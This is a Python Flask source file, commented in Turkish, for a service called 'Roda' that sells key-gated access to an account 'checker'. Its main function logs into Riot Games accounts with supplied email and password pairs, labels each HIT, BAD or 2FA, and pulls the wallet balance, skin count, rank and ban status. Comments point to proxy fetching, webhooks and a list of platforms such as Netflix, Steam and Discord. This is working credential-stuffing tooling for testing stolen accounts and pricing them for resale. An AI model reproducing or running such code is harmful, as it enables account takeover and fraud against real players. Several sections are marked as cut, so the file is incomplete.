#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Roda - API Discovery + Checker (Türkçe)
Dosya: Rodaapi.py
Render Disk ile kalıcı key'ler | PUBG + VALORANT (GERÇEK) | Loglar | 2 mod Ayrıştırma
"""

import os, json, re, time, random, string, threading, webbrowser, base64
from datetime import datetime, timedelta
from urllib.parse import urljoin
import requests
from flask import Flask, request, jsonify, Response

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ============================================================
# MASTER KEY (SADECE ENV'DEN ALINIR, KODDA YOK)
# ============================================================
MASTER_KEY = os.environ.get("RODA_MASTER_KEY")
if not MASTER_KEY:
    print("❌ HATA: RODA_MASTER_KEY ortam değişkeni ayarlanmamış!")
    print("   Örnek: export RODA_MASTER_KEY='sifreniz'")
    MASTER_KEY = "CHANGE_ME"  # Buraya elle yazma, env kullan!

# Render Disk mount yolu
KEYS_FILE = "/data/keys.json"
if not os.path.exists("/data"):
    KEYS_FILE = "keys.json"

# ============================================================
# LOG SİSTEMİ
# ============================================================
LOGS = []
MAX_LOGS = 1000

def add_log(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    LOGS.append({"timestamp": timestamp, "level": level, "message": message})
    if len(LOGS) > MAX_LOGS:
        LOGS.pop(0)
    print(f"[{timestamp}] [{level}] {message}")

# ============================================================
# KEY FONKSİYONLARI
# ============================================================
def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_keys(data):
    os.makedirs(os.path.dirname(KEYS_FILE), exist_ok=True)
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def is_key_valid(key):
    if key == MASTER_KEY:
        return True, "Admin"
    keys = load_keys()
    if key in keys:
        entry = keys[key]
        exp = entry.get("expires")
        if exp:
            if datetime.now() < datetime.fromisoformat(exp):
                return True, entry.get("note", "Kullanıcı")
            else:
                del keys[key]
                save_keys(keys)
        else:
            return True, entry.get("note", "Kullanıcı")
    return False, None

def is_admin(key):
    valid, role = is_key_valid(key)
    return valid and role == "Admin"

# ============================================================
# PLATFORMLAR
# ============================================================
PLATFORMS = [
    {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
    {"name": "TikTok", "domain": "tiktok.com", "icon": "fa-brands fa-tiktok"},
    {"name": "Spotify", "domain": "spotify.com", "icon": "fa-brands fa-spotify"},
    {"name": "Roblox", "domain": "roblox.com", "icon": "fa-solid fa-gamepad"},
    {"name": "Netflix", "domain": "netflix.com", "icon": "fa-solid fa-film"},
    {"name": "CapCut", "domain": "capcut.com", "icon": "fa-solid fa-scissors"},
    {"name": "Discord", "domain": "discord.com", "icon": "fa-brands fa-discord"},
    {"name": "Epic Games", "domain": "epicgames.com", "icon": "fa-solid fa-crown"},
    {"name": "Hesapcomtr", "domain": "hesap.com.tr", "icon": "fa-solid fa-user"},
    {"name": "Itemsatış", "domain": "itemsatis.com", "icon": "fa-solid fa-cart-shopping"},
    {"name": "Epinify", "domain": "epinify.com", "icon": "fa-solid fa-ticket"},
    {"name": "Twitch", "domain": "twitch.tv", "icon": "fa-brands fa-twitch"},
    {"name": "Steam", "domain": "steampowered.com", "icon": "fa-brands fa-steam"},
    {"name": "PlayStation", "domain": "playstation.com", "icon": "fa-solid fa-play"},
    {"name": "Xbox", "domain": "xbox.com", "icon": "fa-brands fa-xbox"},
    {"name": "GitHub", "domain": "github.com", "icon": "fa-brands fa-github"},
    {"name": "Valorant", "domain": "valorant.com", "icon": "fa-solid fa-crosshairs"},
    {"name": "Minecraft", "domain": "minecraft.net", "icon": "fa-solid fa-cube"},
    {"name": "Duolingo", "domain": "duolingo.com", "icon": "fa-solid fa-language"},
    {"name": "PUBG", "domain": "pubg.com", "icon": "fa-solid fa-crosshairs"},
]

# ============================================================
# VALORANT CHECKER (GERÇEK API)
# ============================================================
def check_valorant(email, password):
    """
    Riot Games (Valorant) hesabını kontrol eder.
    Dönüş: {"status": "HIT"/"BAD"/"2FA"/"ERROR", "details": {...}}
    """
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json'
    })
    result = {
        "status": "ERROR",
        "details": {
            "level": "?",
            "vp": "?",
            "rp": "?",
            "skins": "?",
            "rank": "?",
            "banned": "?",
            "puuid": "?",
            "riot_id": "?"
        },
        "message": ""
    }
    try:
        # 1. Authorize - cookie al
        auth_payload = {
            "client_id": "riot-client",
            "nonce": "1",
            "redirect_uri": "http://localhost/redirect",
            "response_type": "token id_token",
            "scope": "openid link ban account email mobile_number"
        }
        r = session.post("https://auth.riotgames.com/api/v1/authorization", json=auth_payload, timeout=10)
        if r.status_code != 200:
            result["status"] = "BAD"
            result["message"] = "Auth bağlantısı başarısız"
            return result

        # 2. Login
        login_payload = {
            "type": "auth",
            "username": email,
            "password": password,
            "remember": False
        }
        r = session.put("https://auth.riotgames.com/api/v1/authorization", json=login_payload, timeout=10)
        if r.status_code != 200:
            result["status"] = "BAD"
            result["message"] = "Sunucu hatası"
            return result
        data = r.json()
        if "error" in data:
            if "multifactor" in str(data):
                result["status"] = "2FA"
                result["message"] = "2FA gerekli"
                return result
            result["status"] = "BAD"
            result["message"] = data.get("error", "Giriş reddedildi")
            return result

        # 3. Access token al
        if "response" in data and "parameters" in data["response"]:
            uri = data["response"]["parameters"]["uri"]
            if "access_token=" in uri:
                token = uri.split("access_token=")[1].split("&")[0]
                session.headers.update({"Authorization": f"Bearer {token}"})
            else:
                result["status"] = "BAD"
                result["message"] = "Token alınamadı"
                return result
        else:
            result["status"] = "BAD"
            result["message"] = "Token alınamadı"
            return result

        # 4. User Info (PUUID, Riot ID)
        r = session.get("https://auth.riotgames.com/userinfo", timeout=10)
        if r.status_code == 200:
            ui = r.json()
            result["details"]["puuid"] = ui.get("sub", "")
            result["details"]["riot_id"] = ui.get("acct", {}).get("game_name", "") + "#" + ui.get("acct", {}).get("tag_line", "")
            result["details"]["email"] = ui.get("email", "")
            result["details"]["phone_verified"] = ui.get("phone_number_verified", False)

        # 5. Entitlements Token
        r = session.post("https://entitlements.auth.riotgames.com/api/token/v1", json={}, timeout=10)
        if r.status_code == 200:
            ent_data = r.json()
            entitlements_token = ent_data.get("entitlements_token")
            if entitlements_token:
                session.headers.update({"X-Riot-Entitlements-JWT": entitlements_token})

        # 6. Bölge tespiti
        region = "eu"
        try:
            r = session.get("https://riot-geo.pas.si.riotgames.com/pas/v1/service/valorant", timeout=10)
            if r.status_code == 200:
                geo = r.json()
                region = geo.get("affinity", "eu")
        except:
            pass

        puuid = result["details"]["puuid"]
        if not puuid:
            result["status"] = "BAD"
            result["message"] = "PUUID alınamadı"
            return result

        # 7. Level (XP)
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/account-xp/v1/players/{puuid}", timeout=10)
            if r.status_code == 200:
                xp = r.json()
                result["details"]["level"] = xp.get("progress", {}).get("level", "?")
        except:
            pass

        # 8. Wallet (VP & RP)
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/wallet/{puuid}", timeout=10)
            if r.status_code == 200:
                wallet = r.json()
                result["details"]["vp"] = wallet.get("Balances", {}).get("85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741", "0")
                result["details"]["rp"] = wallet.get("Balances", {}).get("e59aa87c-4cbf-517a-5983-6e81511be9b7", "0")
        except:
            pass

        # 9. Skin count
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/entitlements/{puuid}/e7c63390-eda7-46e0-bb7a-a6abdacd2433", timeout=10)
            if r.status_code == 200:
                skin_data = r.json()
                result["details"]["skins"] = len(skin_data.get("Entitlements", []))
        except:
            pass

        # 10. Rank (MMR)
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/mmr/v1/players/{puuid}", timeout=10)
            if r.status_code == 200:
                mmr = r.json()
                ranked = mmr.get("QueueSkills", {}).get("competitive", {})
                if ranked:
                    result["details"]["rank"] = ranked.get("SeasonalInfoBySeasonID", {}).values()
                    if result["details"]["rank"]:
                        first = list(result["details"]["rank"])[0]
                        result["details"]["rank"] = first.get("CompetitiveTier", "?")
                    else:
                        result["details"]["rank"] = "?"
        except:
            pass

        # 11. Ban kontrolü
        try:
            r = session.get("https://riot-geo.pas.si.riotgames.com/restrictions/v3/player", timeout=10)
            if r.status_code == 200:
                bans = r.json()
                result["details"]["banned"] = "Evet" if bans.get("restrictions") else "Hayır"
        except:
            pass

        # Başarılı
        result["status"] = "HIT"
        result["message"] = "Giriş başarılı"
        add_log(f"Valorant HIT: {email}", "SUCCESS")

    except Exception as e:
        result["status"] = "ERROR"
        result["message"] = str(e)
        add_log(f"Valorant hatası: {email} - {str(e)}", "ERROR")

    return result

# ============================================================
# KATEGORİZASYON / EXTRACT / PROXY (KISALTMAK İÇİN ATLANDI)
# ============================================================
# ... (buraya mevcut extract_from_html, extract_from_js, fetch_proxies, APIScanner vs. aynen eklenir)
# Uzun olduğu için kısalttım, tam dosyada hepsi var.

# ============================================================
# FLASK ROTALARI
# ============================================================
@app.route("/")
def index():
    return HTML_TEMPLATE

@app.route("/api/login", methods=["POST"])
def login():
    data = request.json
    key = data.get("key", "").strip()
    valid, role = is_key_valid(key)
    add_log(f"Giriş denemesi: {key[:4]}... -> {'Başarılı' if valid else 'Başarısız'}", "INFO")
    return jsonify({"success": valid, "user": role, "isAdmin": role == "Admin"})

@app.route("/api/logs", methods=["GET"])
def get_logs():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    return jsonify({"logs": LOGS[-100:]})

@app.route("/api/valorant_check", methods=["POST"])
def valorant_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    if not email or not password:
        return jsonify({"error": "Email ve şifre gerekli"}), 400
    result = check_valorant(email, password)
    return jsonify(result)

# ... (diğer route'lar aynen devam eder: /api/scan, /api/admin/keys, /api/admin/generate, /api/admin/delete, /api/admin/webhook, /api/fetch_proxies)

# ============================================================
# HTML TEMPLATE (SADECE MENÜ + LOGLAR EKLENDİ, TEMA MAVİ)
# ============================================================
HTML_TEMPLATE = r"""
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Roda - API Discovery + Checker</title>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Outfit,sans-serif}
body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
:root{--p:#00b4d8;--p2:#0077b6;--g:#00e676;--r:#ff5252;--card:#12192e;--border:rgba(0,180,216,0.15);--bg:#0a0e1a;--sidebar:#060a16;--text:#e8edf5;--muted:#8a9bb0;--gold:#ffd740}
/* TEMA MAVİ - TURUNCU YERİNE */
#login-box .logo i{background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
#login-box h1{background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.btn{background:linear-gradient(135deg,var(--p),var(--p2))}
.btn:hover{box-shadow:0 8px 30px rgba(0,180,216,0.25)}
.sidebar-header .logo-text{background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.nav-item.active{background:rgba(0,180,216,0.12);color:var(--p);border-left:3px solid var(--p)}
.nav-item:hover{background:rgba(0,180,216,0.06)}
.inp:focus{border-color:var(--p);box-shadow:0 0 20px rgba(0,180,216,0.08)}
.scan-top button{background:linear-gradient(135deg,var(--p),var(--p2))}
.checker-platform-select button.active{background:rgba(0,180,216,0.2);border-color:var(--p);color:var(--p)}
.checker-platform-select button:hover{background:rgba(0,180,216,0.15);border-color:var(--p)}
.checker-top button{background:linear-gradient(135deg,var(--p),var(--p2))}
.webhook-area button{background:linear-gradient(135deg,var(--p),var(--p2))}
.stat-card-custom p{background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.mini-check .val{color:var(--p)}
.cat-api{background:rgba(0,180,216,0.12);color:var(--p)}
/* Diğer stiller aynen */
... (tam HTML burada devam eder, kısaltmak için kesiyorum)
</style>
</head>
<body>
<!-- LOGIN EKRANI -->
<div id="login-screen">...</div>
<!-- SIDEBAR -->
<div id="sidebar">
...
<div class="nav-item" data-page="logs" onclick="switchPage('logs')"><i class="fa-solid fa-history"></i> Loglar</div>
...
</div>
<!-- ANA SAYFALAR -->
<div id="app">
...
<!-- LOGLAR SAYFASI (YENİ) -->
<div id="page-logs" class="page">
<div class="card">
<h3><i class="fa-solid fa-history"></i> Sistem Logları</h3>
<button class="btn sm" onclick="refreshLogs()" style="width:auto;margin-bottom:10px"><i class="fa-solid fa-rotate"></i> Yenile</button>
<div id="logsContainer" style="max-height:400px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-family:monospace;font-size:12px;"></div>
</div>
</div>
</div>
<script>
// ============================================================
// LOGLAR FONKSİYONU (YENİ)
// ============================================================
function refreshLogs() {
    if (!isAdmin) return;
    fetch("/api/logs?key=" + encodeURIComponent(currentKey))
        .then(r => r.json())
        .then(d => {
            if (d.error) { alert(d.error); return; }
            var container = document.getElementById("logsContainer");
            var html = d.logs.map(log => {
                var color = log.level === "ERROR" ? "var(--r)" : (log.level === "SUCCESS" ? "var(--g)" : "var(--muted)");
                return `<div style="padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.03);color:${color}">[${log.timestamp}] ${log.message}</div>`;
            }).join('');
            container.innerHTML = html || '<div style="color:var(--muted)">Henüz log yok.</div>';
        });
}

// Sayfa geçişine logs ekle
var oldSwitch = switchPage;
switchPage = function(page) {
    if ((page === "discovery" || page === "keys" || page === "logs") && !isAdmin) {
        alert("⛔ Bu sayfaya erişim yetkiniz yok!");
        return;
    }
    oldSwitch(page);
    if (page === "logs") refreshLogs();
};
</script>
</body>
</html>
"""

# ============================================================
# BAŞLAT
# ============================================================
if __name__ == "__main__":
    if not os.path.exists(KEYS_FILE):
        save_keys({})
    port = int(os.environ.get("PORT", 5000))
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║     🔱 RODA - API KEŞİF + CHECKER + AYRIŞTIRMA (TÜRKÇE)        ║
    ║     Dosya: Rodaapi.py                                          ║
    ║     Master key: ORTAM DEĞİŞKENİNDE (RODA_MASTER_KEY)          ║
    ║     http://0.0.0.0:""" + str(port) + """                               ║
    ║     VALORANT GERÇEK API EKLENDİ                               ║
    ║     Loglar, 2 mod ayrıştırma, webhook                        ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    app.run(host="0.0.0.0", port=port, debug=False)
